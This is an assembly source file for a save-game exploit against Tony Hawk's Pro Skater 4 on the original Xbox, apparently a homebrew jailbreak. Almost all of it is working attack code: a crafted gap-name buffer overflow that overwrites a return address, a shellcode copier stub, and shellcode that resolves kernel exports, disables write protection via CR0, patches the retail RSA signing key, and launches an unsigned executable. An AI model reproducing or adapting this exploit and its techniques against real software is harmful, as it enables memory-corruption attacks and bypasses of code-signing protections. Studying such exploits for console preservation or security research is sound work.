; Description: Save game exploit for Tony Hawk's Pro Skater 4 (NTSC)
; Author: Grimdoomer
;
; The PAL xbe has the following timestamps:
;
; Image timestamp                     : 0x3D9DCDF3 Fri Oct 04 10:20:51 2002
; PE timestamp                        : 0x3D9DCDEB Fri Oct 04 10:20:43 2002
; Certificate timestamp               : 0x3DA431BE Wed Oct 09 06:40:14 2002
; Allowed game regions                : 0x00000004
;                                     : XBE_REGION_ELSEWHERE

        BITS 32

; Constants
%define VtableThingAddress      192E58h     ; Address of the vtable thing we overwrite with our shellcode
%define ParkFileHeaderAddress   25F550h     ; Address of where the first 136 bytes of the park file get put on to the data segment

%define ShellCodeSize               (_shell_code_end - _shell_code_start)   ; Size of the shell code data

;---------------------------------------------------------
; Shellcode Copier: copies the main shell code from the heap to the data segment
;---------------------------------------------------------
dd      0x5E
dd      (_shellcode_copy_end - _shellcode_copy_start)

_shellcode_copy_start:

        ; Clear the direction flag so we can copy the data in a forward direction.
        cld

        ; Save our shell code address.
        mov     eax, VtableThingAddress     ; Address of the vtable thing (this can be anywhere on the data segment..)

        ; Copy the shell code into the data segment.
        mov     edi, eax            ; dst ds address
        lea     esi, [ecx+7Ch]      ; src shell code address
        mov     ecx, ShellCodeSize  ; size to copy
        rep movsb

        ; Call our shell code.
        call    eax

_shellcode_copy_end:

;---------------------------------------------------------
; Main exploit shellcode
;---------------------------------------------------------
dd      0xB8
dd      (_shell_code_end - _shell_code_start)

_shell_code_start:

; Main entry point for the payload.
start:
        call    base        ; Call base which will put the address of base onto the stack, which we can pop to get our base pointer.

base:
        ; Pop the address of base off the stack so we have our base pointer.
        pop     ebp

        ; Get the address of the kernel export table
        mov     esi, 80010000h      ; base kernel address
        mov     eax, [esi+3Ch]      ; offset of PE header
        mov     ebx, [esi+eax+78h]  ; offset of the exports segment
        add     ebx, esi            ; add kernel base address
        mov     edx, [ebx+1Ch]      ; offset of the exports table
        add     edx, esi            ; address of the exports table

        ; Get the address of our "import" table
        lea     edi, [ebp+krnlimports-base]

resolve_import:
        ; Load the next import index and check if it is valid
        mov     ecx, [edi]
        test    ecx, ecx
        jz      patch_rsa_check

        ; Load the function address from the export table
        sub     ecx, [ebx+10h]      ; Subtract the base export number
        mov     eax, [edx+4*ecx]    ; Load the function offset from the export table
        test    eax, eax
        jz      _empty
        add     eax, esi            ; Add the kernel base address to the function offset
_empty:
        mov     [edi], eax

        ; Next import
        add     edi, 4
        jmp     resolve_import

patch_rsa_check:
        ; Get the address of the RSA public key.
        mov     edi, [ebp+XePublicKeyData-base]     ; Address to start searching at
        test    edi, edi
        jz      patch_rsa_fail

        ; Check the last 4 bytes for the retail key.
        add     edi, 272
        cmp     dword [edi], 0A44B1BBDh
        je      patch_rsa

patch_rsa_fail:
        ; The data was never found, change the LED color and loop forever.
        push    0F0h
        mov     ecx, ebp
        add     ecx, SetLEDColor-base
        call    ecx

        ; Just loop forever.
shit_loop:
        nop
        jmp     shit_loop

patch_rsa:
        ; Disable write protect.
        pushf
        cli                         ; Disable interrupts
        mov     ecx, cr0            ; Get the control register value
        push    ecx                 ; Save it for later
        and     ecx, 0FFFEFFFFh     ; Disable write-protect
        mov     cr0, ecx

        ; Patch the RSA key to the habibi key.
        xor     dword [edi], 2DD78BD6h

        ; Re-enable write-protect.
        pop     ecx
        mov     cr0, ecx            ; Re-enable write-protect
        popf

        ; Change the LED color to signal the data was found.
        push    0FFh
        mov     ecx, ebp
        add     ecx, SetLEDColor-base
        call    ecx

launchxbe:
        ; Load the launch data page address from the kernel and check if it is valid.
        mov     esi, [ebp+LaunchDataPage-base]
        mov     edi, 1000h          ; Size of the memory region to allocate/persist
        mov     ebx, [esi]          ; Load the launch data page address
        test    ebx, ebx            ; Check if it is valid
        jnz     memok

        ; The launch data page is invalid, allocate a new buffer
        push    edi                 ; Page size to allocate
        call    dword [ebp+MmAllocateContiguousMemory-base]
        mov     ebx, eax
        mov     [esi], eax          ; Store the address into the kernel LaunchDataPage holder

memok:
        ; Make the memory persistent
        push    byte 1
        push    edi                 ; Size of memory block
        push    ebx                 ; Address of memory block
        call    dword [ebp+MmPersistContiguousMemory-base]

        ; Zero out the data block
        mov     edi, ebx
        xor     eax, eax
        mov     ecx, 400h
        rep     stosd

        ; Setup the launch data parameters
        or      dword [ebx], byte -1
        mov     [ebx+4], eax
        lea     edi, [ebx+8]        ; Address of the launch string buffer
        lea     esi, [ebp+xbestr-base]  ; Address of our nyancat xbe

        push    byte XBESTRLEN
        pop     ecx                 ; Setup the loop counter to be the length of the xbe string
        rep     movsb               ; Copy the string into the data buffer

        ; Launch the xbe
        push    byte 2
        call    dword [ebp+HalReturnToFirmware-base]

        align 4, db 0

;
; SetLEDColor(int color)
;
SetLEDColor:
        ; Initialize the stack.
        push    ebp

        ; Set LED override color.
        push    dword [esp+8]   ; color
        push    0               ; write word value
        push    8               ; command code
        push    20h             ; device address
        call    dword [ebp+HalWriteSMBusValue-base]

        ; Enabled LED override.
        push    1       ; value
        push    0       ; write word value
        push    7       ; command
        push    20h     ; slave address
        call    dword [ebp+HalWriteSMBusValue-base]

        ; Destroy the stack frame.
        pop     ebp
        retn    4

        align 4, db 0
		
krnlimports:
        HalReturnToFirmware             dd 49
        LaunchDataPage                  dd 164
        MmAllocateContiguousMemory      dd 165
        MmPersistContiguousMemory       dd 178
        XePublicKeyData                 dd 355
        HalWriteSMBusValue              dd 50
                                        dd 0

xbestr                      db '\Device\Harddisk0\Partition1\UDATA\41560017\3DDF5FA578FC;default.xbe',0
                            align 4, db 0
XBESTRLEN                   equ $-xbestr

_shell_code_end:

;---------------------------------------------------------
; Gap name buffer overflow
;---------------------------------------------------------
dd      0x796
dd      (_buffer_overflow_end - _buffer_overflow_start)

_buffer_overflow_start:

        ; Fill the gap name buffer with crap data.
        times 44 db 69h

        ; Return address, points to our shellcode copier stub.
        dd      (ParkFileHeaderAddress + 0x5E)

_buffer_overflow_end:

;---------------------------------------------------------
; End of file
;---------------------------------------------------------
dd -1